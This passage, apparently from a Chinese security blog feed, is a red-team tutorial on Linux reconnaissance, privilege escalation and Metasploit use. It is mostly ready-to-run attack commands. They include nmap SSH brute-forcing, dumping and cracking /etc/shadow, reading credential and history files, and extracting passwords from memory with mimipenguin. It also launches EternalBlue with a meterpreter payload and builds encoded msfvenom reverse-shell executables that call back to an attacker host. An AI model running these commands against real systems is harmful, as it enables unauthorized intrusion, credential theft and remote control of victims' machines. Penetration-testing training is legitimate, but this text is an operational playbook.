        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下信息搜集及msf工具用法</title>
    <url>/article/fad2c18a.html</url>
    <content><![CDATA[<h3 id="00x01linux下的信息收集"><a class="anchor" href="#00x01linux下的信息收集">#</a> 00x01.Linux 下的信息收集</h3>
<p><code>linux</code>  下多以端口扫描、 <code>IP</code>  扫描、 <code>MAC</code>  扫描等为主的手段进行信息搜集</p>
<h4 id="nmap之前期的信息收集"><a class="anchor" href="#nmap之前期的信息收集">#</a> NMAP 之前期的信息收集</h4>
<p><code>nmap</code>  作为渗透测试最常用的工具之一会出现在各种场景中，其功能也非常丰富，不仅可以扫描端口也可以探测指定网段存活主机。</p>
<p>扫描主机端口：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span><span class="token constant">T5</span> <span class="token operator">-</span><span class="token constant">A</span> <span class="token operator">-</span>v <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">&lt;</span>target ip<span class="token operator">></span></pre></td></tr></table></figure><p>扫描一个 IP 段，探测存活主机：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sP <span class="token operator">&lt;</span>network address<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">CIDR</span><span class="token operator">></span></pre></td></tr></table></figure><p>探测操作系统类型：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span><span class="token number">0</span> <span class="token operator">&lt;</span>target <span class="token constant">IP</span><span class="token operator">></span></pre></td></tr></table></figure><p>甚至指定相应脚本还可以扫描漏洞和爆破弱口令，如下：</p>
<p>寻找登录授权页面：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p <span class="token number">80</span> <span class="token operator">--</span>script http<span class="token operator">-</span>auth<span class="token operator">-</span>finder <span class="token operator">&lt;</span>www<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span>com<span class="token operator">></span></pre></td></tr></table></figure><p><code>SSH</code>  爆破：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p22 <span class="token operator">--</span>script ssh<span class="token operator">-</span>brute <span class="token operator">&lt;</span>target ip<span class="token operator">></span></pre></td></tr></table></figure><p><code>dns</code>  域传送漏洞：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p <span class="token number">53</span> <span class="token operator">--</span>script dns<span class="token operator">-</span>zone<span class="token operator">-</span>transfer<span class="token punctuation">.</span>nse <span class="token operator">-</span>v <span class="token operator">&lt;</span>target ip<span class="token operator">></span></pre></td></tr></table></figure><p>除了 <code>nmap</code>  工具以外，在需要扫描大量主机端口的情况下， <code>masscan</code>  是一个非常推荐的手段：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Masscan <span class="token number">127.0</span>.0.0/24 -p443  <span class="token comment"># 单端口扫描</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Masscan <span class="token number">127.0</span>.0.0/24 --top-ports <span class="token number">100</span> -rate <span class="token number">100000</span>  <span class="token comment"># 快速扫描</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Masscan <span class="token number">127.0</span>.0.0/24 --top-ports <span class="token number">100</span> --excludefile exclude.txt <span class="token comment"># 排除指定目标</span></pre></td></tr><tr><td data-num="4"></td><td><pre>masscan <span class="token number">127.0</span>.0.0/24 -p20,21,22,23,80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070 <span class="token operator">></span> results.txt</pre></td></tr></table></figure><p>当然，这些远远不足以让攻击方拿下一台机器，这只是作为黑盒情况下的 <code>Linux</code>  主机信息收集的方式。</p>
<h4 id="中期的信息收集"><a class="anchor" href="#中期的信息收集">#</a> 中期的信息收集</h4>
<p>在运维人员能保证系统和软件维持在新版本、无弱口令、无特殊 <code>SUID</code>  文件、 <code>sudo</code>  命令的情况下， <code>Linux</code>  提权是基本不可能的，但是安全很难做到万无一失。</p>
<p>在各种环境中存在各种不同版本的 <code>Linux</code>  系统，甚至类 <code>UNIX</code>  系统，比如: <code>OpenSUSE</code> 、 <code>Fedora</code> 、 <code>Oracle Linxu</code> 、 <code>Slackware</code> 、 <code>FreeBSD</code> 、 <code>OpenBSD</code>  等等，所以先摸清系统版本信息是关键。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>hostname                    # 查看服务器主机名命令</pre></td></tr><tr><td data-num="2"></td><td><pre>uname <span class="token operator">-</span>a</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128171121602.png" alt="image-20211128172549492" /></p>
<p>查看内核信息：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>uname <span class="token operator">-</span>mrs</pre></td></tr><tr><td data-num="2"></td><td><pre>rpm <span class="token operator">-</span>q <span class="token operator">&lt;</span>软件包名称<span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre>dmesg <span class="token operator">|</span> grep Linux</pre></td></tr><tr><td data-num="4"></td><td><pre>ls <span class="token operator">/</span>boot <span class="token operator">|</span> grep vmlinuz<span class="token operator">-</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128171619072.png" alt="image-20211128172623959" /></p>
<p>明白了系统的版本或发行版，下一步就针对这个搜索有关的提权漏洞，这里以  <code>ubuntu20.04</code>  为例，使用  <code>Exploit-DB</code>  的命令行搜索工具  <code>searchsploit</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>searchsploit <span class="token operator">-</span>w ubuntu <span class="token number">20.04</span> <span class="token number">4.4</span><span class="token punctuation">.</span>x</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128172642929.png" alt="image-20211128172642929" /></p>
<p>若是不存在提权漏洞的版本，那么注意点就要放到用户的信息上了。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>id                          # 显示真实有效的用户 <span class="token constant">ID</span><span class="token punctuation">(</span><span class="token constant">UID</span><span class="token punctuation">)</span>和组 <span class="token constant">ID</span><span class="token punctuation">(</span><span class="token constant">GID</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>whoami                      # 当前用户</pre></td></tr><tr><td data-num="3"></td><td><pre>groups                      # 当前组</pre></td></tr><tr><td data-num="4"></td><td><pre>who                         # 显示目前登录系统的用户信息</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128172901783.png" alt="image-20211128172901783" /></p>
<p>比如 SUID 文件和 sudo 权限</p>
<p>找带 suid 的文件</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128173034957.png" alt="image-20211128173034957" /></p>
<p>查看当前用户执行哪些 sudo 命令无需密码</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo <span class="token operator">-</span>l</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128173101546.png" alt="image-20211128173101546" /></p>
<p>找到了可以 sudo 执行的文件又怎么提权呢？这里推荐一个网站 <span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">https://gtfobins.github.io/</span> 其中记录了大量的提权方案。</p>
<h4 id="后期的信息收集"><a class="anchor" href="#后期的信息收集">#</a> 后期的信息收集</h4>
<p>到了后期阶段，当攻击者成功提权，信息收集的目的其实偏向于扩大战果，而不是寻找突破口，红方人员会详尽一且办法，挖掘机器上有用的信息，然后作为跳板横向进攻。</p>
<p>知晓机器上运行着什么进程可以推测机器的定位</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ps</span> -aux                     <span class="token comment"># 列出所有进程以及相关信息命令</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">ps</span> -ef</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">top</span>                         <span class="token comment"># 总览系统全面信息命令，Ctrl + C 退出界面</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128175139989.png" alt="image-20211128175139989" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128175201332.png" alt="image-20211128175201332" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128175216956.png" alt="image-20211128175216956" /></p>
<p>安装了哪些程序？什么版本？是否正在运行？</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span></pre></td></tr><tr><td data-num="2"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span>sbin<span class="token operator">/</span></pre></td></tr><tr><td data-num="3"></td><td><pre>dpkg <span class="token operator">-</span>l</pre></td></tr><tr><td data-num="4"></td><td><pre>rpm <span class="token operator">-</span>qa</pre></td></tr><tr><td data-num="5"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>cache<span class="token operator">/</span>apt<span class="token operator">/</span>archivesO</pre></td></tr><tr><td data-num="6"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>cache<span class="token operator">/</span>yum<span class="token operator">/</span></pre></td></tr></table></figure><p>在查看一些常见的服务配置文件</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>syslog<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="2"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>chttp<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="3"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>lighttpd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="4"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>cups<span class="token operator">/</span>cupsd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="5"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>inetd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="6"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>apache2<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="7"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="8"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span>httpd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="9"></td><td><pre>cat <span class="token operator">/</span>opt<span class="token operator">/</span>lampp<span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token punctuation">.</span>conf</pre></td></tr><tr><td data-num="10"></td><td><pre>ls <span class="token operator">-</span>aRl <span class="token operator">/</span>etc<span class="token operator">/</span> <span class="token operator">|</span> awk '$1 <span class="token operator">~</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^.*r.*</span><span class="token regex-delimiter">/</span></span></pre></td></tr></table></figure><p>如果时间充足，看一看日志文件也是很好的选择，这里就不多阐述，在之后的蓝队篇中会介绍。作为最高权限用户， <code>shadow</code>  文件不可不看，万一跑出几个密码，横向渗透的成功率就会大大提高，将 <code>passwd</code>  和 <code>shadow</code>  文件下载到 <code>kali</code>  中进行 <code>unshadow</code> ，随后 <code>john</code>  爆破 <code>hash</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mkdir <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="2"></td><td><pre>cd <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="3"></td><td><pre>unshadow passwd<span class="token punctuation">.</span>txt shadow<span class="token punctuation">.</span>txt <span class="token operator">></span> hash<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p>除了 <code>shadow</code>  意外也可以看一看其他敏感文件，比如数据库的配置、历史记录等</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>apache2<span class="token operator">/</span>config<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="2"></td><td><pre>cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql<span class="token operator">/</span>user<span class="token punctuation">.</span><span class="token constant">MYD</span></pre></td></tr><tr><td data-num="3"></td><td><pre>cat <span class="token operator">/</span>root<span class="token operator">/</span>anaconda<span class="token operator">-</span>ks<span class="token punctuation">.</span>cfg</pre></td></tr><tr><td data-num="4"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>bash_history</pre></td></tr><tr><td data-num="5"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>nano_history</pre></td></tr><tr><td data-num="6"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>atftp_history</pre></td></tr><tr><td data-num="7"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>mysql_history</pre></td></tr><tr><td data-num="8"></td><td><pre>cat <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>php_history</pre></td></tr></table></figure><p>邮件也是一个关键点，某些场景下，可以发现非常敏感的信息。</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>ls <span class="token operator">-</span>alh <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>mail<span class="token operator">/</span></pre></td></tr></table></figure><p>除了本机器上的信息还要为拿下内网的其他机器做准备，摸清网络拓扑是必须的。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>route</pre></td></tr><tr><td data-num="2"></td><td><pre>ip route        # 显示核心路由表</pre></td></tr><tr><td data-num="3"></td><td><pre>ip neigh        # 显示邻居表</pre></td></tr><tr><td data-num="4"></td><td><pre>cat <span class="token operator">/</span>etc<span class="token operator">/</span>resolv<span class="token punctuation">.</span>conf  # 查看<span class="token constant">DNS</span></pre></td></tr><tr><td data-num="5"></td><td><pre>arp <span class="token operator">-</span>e</pre></td></tr></table></figure><h3 id="00x03linux后渗透之信息收集metasploit"><a class="anchor" href="#00x03linux后渗透之信息收集metasploit">#</a> 00x03.Linux 后渗透之信息收集（metasploit）</h3>
<h4 id="msf启动"><a class="anchor" href="#msf启动">#</a> msf 启动</h4>
<p>输入命令 <code>msfconsole</code> ， <code>-q</code>  命令是不显示 <code>msflogo</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128175938642.png" alt="image-20211128175938642" /></p>
<h4 id="检查虚拟机"><a class="anchor" href="#检查虚拟机">#</a> 检查虚拟机</h4>
<p>所述<strong> checkvm</strong> 模块尝试来确定系统是否正在运行的虚拟环境的内部和如果是这样，哪一个。该模块支持  <code>Hyper-V、VMWare、VirtualBox、Xen 和 QEMU/KVM</code>  的检测。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128180049268.png" alt="image-20211128180049268" /></p>
<h4 id="枚举配置"><a class="anchor" href="#枚举配置">#</a> 枚举配置</h4>
<p>该<strong> enum_configs</strong> 上普遍安装的应用程序和服务，如 <code>Apache，MySQL</code>  和桑巴， <code>Sendmail</code>  的，等发现模块收集配置文件如果在默认路径中找到一个配置文件，该模块将认为是我们想要的文件。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128180210283.png" alt="image-20211128180210283" /></p>
<h4 id="枚举网络"><a class="anchor" href="#枚举网络">#</a> 枚举网络</h4>
<p>所述<strong> enum_network</strong> 从目标系统模块枚举网络信息的防火墙规则，接口，无线信息，打开和监听端口，活动的网络连接， <code>DNS</code>  信息和 <code>SSH</code>  信息。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128180311671.png" alt="image-20211128180311671" /></p>
<h4 id="枚举保护"><a class="anchor" href="#枚举保护">#</a> 枚举保护</h4>
<p>该<strong> enum_protections</strong> 模块试图找到某些安装的应用程序，可用于防止，或发现我们的攻击，这是通过查找特定的二进制位置完了，看看他们是否确实可执行文件。例如，如果我们能够将'snort' 作为命令运行，我们假设它是我们正在寻找的文件之一。该模块旨在涵盖各种防病毒、rootkit、IDS/IPS、防火墙和其他软件。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128180358620.png" alt="image-20211128180358620" /></p>
<h4 id="枚举系统"><a class="anchor" href="#枚举系统">#</a> 枚举系统</h4>
<p>该<strong> enum_system</strong> 模块收集系统信息。它收集已安装的包、已安装的服务、挂载信息、用户列表、用户 bash 历史记录和 cron 作业</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128180438152.png" alt="image-20211128180438152" /></p>
<h4 id="用户具体信息history"><a class="anchor" href="#用户具体信息history">#</a> 用户具体信息 HISTORY</h4>
<p>该<strong> enum_users_history</strong> 模块收集用户的具体信息。用户列表、bash 历史、mysql 历史、vim 历史、lastlog 和 sudoers。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128180521064.png" alt="image-20211128180521064" /></p>
<h3 id="00x04linux下抓取登陆用户密码神器mimipenguin"><a class="anchor" href="#00x04linux下抓取登陆用户密码神器mimipenguin">#</a> 00x04.Linux 下抓取登陆用户密码神器 mimipenguin</h3>
<p><code>mimipenguin</code>  就像是 <code>windows</code>  中的 <code>Mimikatz</code></p>
<p>下载命令：</p>
<pre><code class="language-ABAP">git clone https://github.com.cnpmjs.org/huntergregal/mimipenguin 
</code></pre>
<p><strong>root 权限</strong>下运行，通过转储过程和提取那些包含明文密码可能性很高的行 (hang)，充分利用内存中的明文凭证。通过检查 <code>/etc/shadow</code>  文件 <code>hash</code> , 内存中的 <code>hash</code>  和正则匹配去尝试计算出每个单词的概率</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211128181246919.png" alt="image-20211128181246919" /></p>
<h3 id="00x05msf工具简单用法"><a class="anchor" href="#00x05msf工具简单用法">#</a> 00x05.msf 工具简单用法</h3>
<h4 id="msf使用方法"><a class="anchor" href="#msf使用方法">#</a> <strong>msf 使用方法</strong></h4>
<h5 id="1-使用方法"><a class="anchor" href="#1-使用方法">#</a> <strong>1 使用方法</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">进入msf</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>msfconsolesearch</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">命令查找模块</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>search ms17<span class="token operator">-</span>010use</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token literal-property property">进入模块</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span><span class="token function">ms17_010_eternalblue</span> <span class="token punctuation">(</span>search以后use <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">模块详细信息查看</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>use了以后info，没use 之前 info exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token literal-property property">设置攻击载荷</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token literal-property property">查看模块需要的参数</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>options</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token literal-property property">设置参数</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">set</span> lhost <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">(</span>参数名似乎不区分大小写<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token literal-property property">攻击</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>run <span class="token operator">/</span> exploit 都可以meterpreter后渗透阶段</pre></td></tr></table></figure><h5 id="2-rc脚本执行多个msf命令"><a class="anchor" href="#2-rc脚本执行多个msf命令">#</a> <strong>2 rc 脚本执行多个 msf 命令</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole <span class="token operator">-</span>r configure<span class="token punctuation">.</span>rc</pre></td></tr></table></figure><h4 id="msfvenom生成shellcode"><a class="anchor" href="#msfvenom生成shellcode">#</a> <strong>msfvenom 生成 shellcode</strong></h4>
<h5 id="1-一般生成"><a class="anchor" href="#1-一般生成">#</a> <strong>1 . 一般生成</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span>p 载荷 </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span>f 输出格式 </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span>o 输出文件msfvenom </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="6"></td><td><pre>大部分时候也是需要一些配置 lhost lport这些：</pre></td></tr><tr><td data-num="7"></td><td><pre>msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> lport<span class="token operator">=</span><span class="token number">8888</span><span class="token operator">-</span>i <span class="token number">3</span><span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr></table></figure><h5 id="2-编码生成"><a class="anchor" href="#2-编码生成">#</a> <strong>2. 编码生成</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom</pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token operator">-</span>a 系统架构</pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token operator">--</span>platform 系统平台</pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token operator">-</span>p 有效载荷</pre></td></tr><tr><td data-num="5"></td><td><pre>    lhost<span class="token operator">=</span>攻击机<span class="token constant">IP</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    lport<span class="token operator">=</span>攻击机端口</pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token operator">-</span>e 编码方式</pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token operator">-</span>i 编码次数</pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token operator">-</span>f 输出格式</pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token operator">-</span>o 输出文件</pre></td></tr><tr><td data-num="11"></td><td><pre>msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp lhost<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span> lport<span class="token operator">=</span><span class="token number">8888</span><span class="token operator">-</span>i <span class="token number">3</span><span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="12"></td><td><pre>一般来说 <span class="token operator">-</span>a可以不用，<span class="token operator">--</span>platform也可以不用</pre></td></tr></table></figure><h5 id="3-查看支持的系统架构"><a class="anchor" href="#3-查看支持的系统架构">#</a> <strong>3. 查看支持的系统架构</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l archs</pre></td></tr></table></figure><h5 id="4-查看支持的系统平台"><a class="anchor" href="#4-查看支持的系统平台">#</a> <strong>4. 查看支持的系统平台</strong></h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l platforms</pre></td></tr></table></figure><h5 id="5-列出所有payload"><a class="anchor" href="#5-列出所有payload">#</a> <strong>5. 列出所有 payload</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l payload</pre></td></tr></table></figure><h5 id="6-列出所有的输出格式"><a class="anchor" href="#6-列出所有的输出格式">#</a> <strong>6. 列出所有的输出格式</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l formats</pre></td></tr></table></figure><h5 id="7-列出所有的加密方式"><a class="anchor" href="#7-列出所有的加密方式">#</a> <strong>7. 列出所有的加密方式</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l encrypt</pre></td></tr></table></figure><h5 id="8-列出所有的编码器"><a class="anchor" href="#8-列出所有的编码器">#</a> <strong>8. 列出所有的编码器</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>l encoders</pre></td></tr></table></figure><h4 id="常见生成格式"><a class="anchor" href="#常见生成格式">#</a> <strong>常见生成格式</strong></h4>
<h5 id="1windows"><a class="anchor" href="#1windows">#</a> <strong>1.windows</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform windows <span class="token operator">-</span>a x86 <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>i <span class="token number">3</span><span class="token operator">-</span>ex86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>f exe <span class="token operator">-</span>o payload<span class="token punctuation">.</span>exe</pre></td></tr></table></figure><h5 id="2-linux"><a class="anchor" href="#2-linux">#</a> <strong>2. Linux</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform linux <span class="token operator">-</span>a x86 <span class="token operator">-</span>p linux<span class="token operator">/</span>x86<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>f elf <span class="token operator">-</span>opayload<span class="token punctuation">.</span>elf</pre></td></tr></table></figure><h5 id="3-mac"><a class="anchor" href="#3-mac">#</a> <strong>3. Mac</strong></h5>
